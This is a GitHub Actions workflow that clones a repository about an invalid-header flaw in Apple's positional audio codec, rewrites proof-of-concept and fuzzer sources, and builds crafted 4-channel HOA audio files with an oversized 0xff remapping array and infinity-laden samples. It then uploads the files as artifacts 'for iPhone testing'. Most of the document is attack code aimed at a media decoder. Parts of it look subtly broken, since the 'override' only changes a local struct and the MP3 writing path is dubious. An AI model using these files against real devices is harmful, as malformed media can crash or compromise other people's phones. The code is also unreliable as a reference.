name: Generate Audio Files for iPhone Testing

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-generate:
    runs-on: macos-latest
    timeout-minutes: 30

    steps:
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          echo "Listing directory contents at $(date)"
          ls -l
          echo "Repository cloned and directory listed at $(date)"

      - name: Patch encodeme.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm at $(date)"
          cat > encodeme.mm << 'EOF'
          @import AVFAudio;
          @import AudioToolbox;
          #include <vector>
          #include <random>

          struct CodecConfig {
            char padding0[0x78];
            AudioChannelLayout* remappingChannelLayout;
            char padding1[0xe0 - 0x80];
            std::vector<char> mRemappingArray;

            CodecConfig() : remappingChannelLayout(nullptr) {}
            ~CodecConfig() {
              if (remappingChannelLayout) {
                free(remappingChannelLayout);
              }
            }
          };

          void OverrideApac(CodecConfig* config) {
            if (config->remappingChannelLayout) {
              config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3; // Order 1, 4 channels
            }
            config->mRemappingArray.resize(1024, 0xff);
          }

          int main() {
            std::vector<double> sampleRates = {16000, 44100, 48000, 96000};
            std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> formatDist(0, formats.size() - 1);

            for (double sampleRate : sampleRates) {
              AudioFormatID formatID = formats[formatDist(gen)];
              if (formatID == kAudioFormatMPEG4AAC && sampleRate < 16000) {
                fprintf(stderr, "Skipping unsupported sample rate %.0f for AAC\n", sampleRate);
                continue;
              }
              uint32_t channelNum = 4;
              AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate
                                                                                       channels:channelNum];
              AudioStreamBasicDescription outputDescription = {
                  .mSampleRate = sampleRate,
                  .mFormatID = formatID,
                  .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : 0,
                  .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                  .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : 1),
                  .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                  .mChannelsPerFrame = channelNum,
                  .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : 0),
                  .mReserved = 0
              };

              AVAudioChannelLayout* channelLayout = [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3];

              CodecConfig config;
              AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
              if (!channelLayoutCopy) {
                fprintf(stderr, "Memory allocation failed for sample rate %.0f\n", sampleRate);
                continue;
              }
              memcpy(channelLayoutCopy, channelLayout.layout, sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
              config.remappingChannelLayout = channelLayoutCopy;

              OverrideApac(&config);

              NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.m4a", sampleRate, formatID];
              NSURL* outUrl = [NSURL fileURLWithPath:fileName];
              ExtAudioFileRef audioFile = nullptr;
              OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileM4AType,
                                                          &outputDescription, config.remappingChannelLayout,
                                                          kAudioFileFlags_EraseFile, &audioFile);
              if (status) {
                fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                free(channelLayoutCopy);
                continue;
              }

              status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                               sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
              if (status) {
                fprintf(stderr, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                ExtAudioFileDispose(audioFile);
                free(channelLayoutCopy);
                continue;
              }

              status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                               sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum, formatIn.channelLayout.layout);
              if (status) {
                fprintf(stderr, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                ExtAudioFileDispose(audioFile);
                free(channelLayoutCopy);
                continue;
              }

              float audioBuffer[44100 * channelNum];
              std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
              for (int i = 0; i < 44100 * channelNum; ++i) {
                audioBuffer[i] = dis(gen);
              }
              AudioBufferList audioBufferList = {
                  .mNumberBuffers = 1,
                  .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(sizeof(audioBuffer)), .mData = audioBuffer}},
              };
              status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);
              if (status) {
                fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }

              status = ExtAudioFileDispose(audioFile);
              if (status) {
                fprintf(stderr, "Error closing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }

              free(channelLayoutCopy);
            }
            return 0;
          }
          EOF
          echo "encodeme.mm patched at $(date)"

      - name: Patch fuzzer.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching fuzzer.mm at $(date)"
          cat > fuzzer.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AVFAudio/AVFAudio.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <vector>
          #include <random>
          #include <stdio.h>
          #include <stdlib.h>
          #include <time.h>

          struct CodecConfig {
            char padding0[0x78];
            AudioChannelLayout* remappingChannelLayout;
            char padding1[0xe0 - 0x80];
            std::vector<char> mRemappingArray;

            CodecConfig() : remappingChannelLayout(nullptr) {}
            ~CodecConfig() {
              if (remappingChannelLayout) {
                free(remappingChannelLayout);
              }
            }
          };

          void OverrideApac(CodecConfig* config) {
            if (config->remappingChannelLayout) {
              config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3;
            }
            config->mRemappingArray.resize(1024, 0xff);
          }

          NSString* generateFuzzedAudio(NSString* inputPath, bool isMP3, FILE* logFile) {
            if (logFile) {
              time_t now = time(NULL);
              fprintf(logFile, "Generating fuzzed audio at %s", ctime(&now));
            }
            std::vector<double> sampleRates = {16000, 44100, 48000, 96000};
            std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> formatDist(0, formats.size() - 1);
            std::uniform_int_distribution<> rateDist(0, sampleRates.size() - 1);
            std::uniform_real_distribution<float> volumeDis(0.0f, 2.0f);
            std::uniform_int_distribution<> channelFuzz(3, 5);

            double sampleRate = sampleRates[rateDist(gen)];
            AudioFormatID formatID = formats[formatDist(gen)];
            uint32_t channelNum = channelFuzz(gen);

            if (logFile) {
              fprintf(logFile, "Params: sampleRate=%.0f, formatID=%u, channels=%u, isMP3=%d\n", 
                      sampleRate, formatID, channelNum, isMP3);
            }
            fprintf(stderr, "Generating fuzzed audio: sampleRate=%.0f, formatID=%u, channels=%u, isMP3=%d\n", 
                    sampleRate, formatID, channelNum, isMP3);

            AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
            AudioStreamBasicDescription outputDesc = {
                .mSampleRate = sampleRate,
                .mFormatID = formatID,
                .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : 0,
                .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : 1),
                .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                .mChannelsPerFrame = channelNum,
                .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : 0),
                .mReserved = 0
            };

            AVAudioChannelLayout* channelLayout = [[AVAudioChannelLayout alloc] initWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3];
            CodecConfig config;
            AudioChannelLayout* layoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
            if (!layoutCopy) {
              if (logFile) {
                fprintf(logFile, "Memory allocation failed for rate %.0f\n", sampleRate);
              }
              fprintf(stderr, "Memory allocation failed for rate %.0f\n", sampleRate);
              return nil;
            }
            memcpy(layoutCopy, channelLayout.layout, sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum);
            config.remappingChannelLayout = layoutCopy;
            OverrideApac(&config);

            NSString* fileName = [NSString stringWithFormat:@"fuzzed_%.0f_%u_%u.%@", sampleRate, formatID, channelNum, isMP3 ? @"mp3" : @"m4a"];
            NSString* tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:fileName];
            NSURL* outUrl = [NSURL fileURLWithPath:tempPath];

            if (logFile) {
              fprintf(logFile, "Creating file at path: %s\n", tempPath.UTF8String);
            }
            fprintf(stderr, "Creating file at path: %s\n", tempPath.UTF8String);

            ExtAudioFileRef audioFile = nullptr;
            OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl,
                                                       isMP3 ? kAudioFileMP3Type : kAudioFileM4AType,
                                                       &outputDesc, config.remappingChannelLayout,
                                                       kAudioFileFlags_EraseFile, &audioFile);
            if (status) {
              if (logFile) {
                fprintf(logFile, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }
              fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              free(layoutCopy);
              return nil;
            }

            status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                             sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
            if (status) {
              if (logFile) {
                fprintf(logFile, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }
              fprintf(stderr, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              ExtAudioFileDispose(audioFile);
              free(layoutCopy);
              return nil;
            }

            status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                             sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum, formatIn.channelLayout.layout);
            if (status) {
              if (logFile) {
                fprintf(logFile, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }
              fprintf(stderr, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              ExtAudioFileDispose(audioFile);
              free(layoutCopy);
              return nil;
            }

            float audioBuffer[1024 * channelNum];
            std::uniform_real_distribution<float> dis(-2.0f, 2.0f);
            for (int i = 0; i < 1024 * channelNum; ++i) {
              audioBuffer[i] = dis(gen);
              if (rand() % 100 < 5) {
                audioBuffer[i] = (rand() % 2) ? std::numeric_limits<float>::infinity() : -std::numeric_limits<float>::infinity();
              }
            }
            float volumeFactor = volumeDis(gen);
            for (int i = 0; i < 1024 * channelNum; ++i) {
              audioBuffer[i] *= volumeFactor;
            }

            AudioBufferList bufferList = {
                .mNumberBuffers = 1,
                .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(sizeof(audioBuffer)), .mData = audioBuffer}}
            };
            status = ExtAudioFileWrite(audioFile, 1024, &bufferList);
            if (status) {
              if (logFile) {
                fprintf(logFile, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }
              fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
            }

            ExtAudioFileDispose(audioFile);
            free(layoutCopy);
            return tempPath;
          }

          int main(int argc, char *argv[]) {
            @autoreleasepool {
              FILE* logFile = fopen("fuzzer_detail.log", "a");
              if (logFile) {
                time_t now = time(NULL);
                fprintf(logFile, "Starting fuzzing at %s", ctime(&now));
              }

              NSString *inputPath = @"output_44100_1635013121.m4a";
              if (argc > 1) {
                inputPath = @(argv[1]);
                if (logFile) {
                  fprintf(logFile, "Using input path: %s\n", inputPath.UTF8String);
                }
              }

              int iterations = 5;
              if (argc > 2) {
                iterations = atoi(argv[2]);
                if (logFile) {
                  fprintf(logFile, "Setting iterations: %d\n", iterations);
                }
              }

              for (int i = 0; i < iterations; i++) {
                if (logFile) {
                  time_t now = time(NULL);
                  fprintf(logFile, "Iteration %d/%d at %s", i + 1, iterations, ctime(&now));
                }
                fprintf(stderr, "Iteration %d/%d\n", i + 1, iterations);

                NSString *tempPathM4A = generateFuzzedAudio(inputPath, false, logFile);
                if (!tempPathM4A) {
                  if (logFile) {
                    fprintf(logFile, "Failed to generate fuzzed .m4a\n");
                  }
                  fprintf(stderr, "Failed to generate fuzzed .m4a\n");
                }

                NSString *tempPathMP3 = generateFuzzedAudio(inputPath, true, logFile);
                if (!tempPathMP3) {
                  if (logFile) {
                    fprintf(logFile, "Failed to generate fuzzed .mp3\n");
                  }
                  fprintf(stderr, "Failed to generate fuzzed .mp3\n");
                }

                if (logFile) {
                  fprintf(logFile, "Completed iteration %d\n", i + 1);
                }
                fprintf(stderr, "Completed iteration %d\n", i + 1);
              }

              if (logFile) {
                time_t now = time(NULL);
                fprintf(logFile, "Fuzzing completed at %s", ctime(&now));
                fclose(logFile);
              }
              fprintf(stderr, "Fuzzing completed\n");
            }
            return 0;
          }
          EOF
          echo "fuzzer.mm patched at $(date)"

      - name: Cache FFmpeg
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/ffmpeg
          key: ffmpeg-${{ runner.os }}-2025-06
          restore-keys: ffmpeg-${{ runner.os }}-

      - name: Install FFmpeg
        run: |
          echo "Installing FFmpeg at $(date)"
          if ! command -v ffmpeg &> /dev/null; then
            brew install ffmpeg
          else
            echo "FFmpeg already installed"
            ffmpeg -version
          fi
          echo "FFmpeg installed at $(date)"

      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1'

      - name: Verify Xcode and clang version
        run: |
          echo "Verifying Xcode and clang versions at $(date)"
          xcodebuild -version
          clang++ --version
          xcrun --sdk macosx --show-sdk-path
          echo "Verification completed at $(date)"

      - name: Verify source files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Verifying files at $(date)"
          for file in encodeme.mm fuzzer.mm; do
            if [ -f "$file" ] && [ -r "$file" ]; then
              echo "$file found and readable"
              ls -l "$file"
            else
              echo "Error: $file not found or not readable"
              ls -l
              exit 1
            fi
          done
          echo "File verification completed at $(date)"

      - name: Compile encodeme
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm at $(date)"
          clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk macosx --show-sdk-path) -framework AVFAudio -framework AudioToolbox encodeme.mm -o encodeme
          if [ $? -eq 0 ]; then
            echo "Compilation completed successfully"
            ls -l encodeme
          else
            echo "Compilation failed"
            exit 1
          fi

      - name: Compile fuzzer
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling fuzzer.mm at $(date)"
          clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk macosx --show-sdk-path) -framework AVFAudio -framework AudioToolbox -framework Foundation fuzzer.mm -o fuzzer
          if [ $? -eq 0 ]; then
            echo "Compilation successful"
            ls -l fuzzer
          else
            echo "Compilation failed"
            exit 1
          fi

      - name: Run encodeme
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Running encodeme at $(date)"
          chmod +x encodeme
          ./encodeme
          if [ $? -eq 0 ]; then
            echo "encodeme executed successfully"
            ls -l output_*.m4a || echo "No output files found"
          else
            echo "encodeme execution failed"
            exit 1
          fi

      - name: Run fuzzer to generate files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Running fuzzer at $(date)"
          chmod +x fuzzer
          for file in output_*.m4a; do
            if [ -f "$file" ]; then
              ./fuzzer "$file" 10 > "fuzzer_$(basename "$file" .m4a).log" 2>&1
              if [ $? -eq 0 ]; then
                echo "fuzzer generated files successfully for $file"
              else
                echo "fuzzer failed for $file"
                cat "fuzzer_$(basename "$file" .m4a).log"
                exit 1
              fi
            else
              echo "No M4A files found for fuzzing"
            fi
          done
          ls -lh fuzzer_*.log fuzzer_detail.log 2>/dev/null || echo "No log files found"

      - name: Convert M4A to MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Converting M4A files to MP3 at $(date)"
          for file in output_*.m4a; do
            if [ -f "$file" ]; then
              mp3_file="${file%.m4a}.mp3"
              ffmpeg -i "$file" -c:a mp3 -b:a 128k -ac 4 "$mp3_file"
              if [ $? -eq 0 ]; then
                echo "Converted $file to $mp3_file successfully"
              else
                echo "Conversion of $file failed"
                exit 1
              fi
            else
              echo "No M4A files found for conversion"
            fi
          done
          echo "Conversion completed at $(date)"

      - name: Verify generated files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking for generated files at $(date)"
          for file in output_*.m4a output_*.mp3 fuzzed_*.m4a fuzzed_*.mp3; do
            if [ -f "$file" ]; then
              FILE_SIZE=$(stat -f %z "$file" 2>/dev/null || stat -c %s "$file")
              echo "$file size: $FILE_SIZE bytes"
              if [ "$FILE_SIZE" -eq 0 ]; then
                echo "Error: $file is 0 bytes"
                exit 1
              fi
              if ! ffprobe -i "$file" -show_format -show_streams -print_format json 2>/dev/null; then
                echo "Error: ffprobe failed for $file"
                exit 1
              fi
            else
              echo "$file not found"
            fi
          done
          echo "File verification completed at $(date)"

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-files
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzed_*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzed_*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzer_*.log
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzer_detail.log
          retention-days: 7
          if-no-files-found: warn
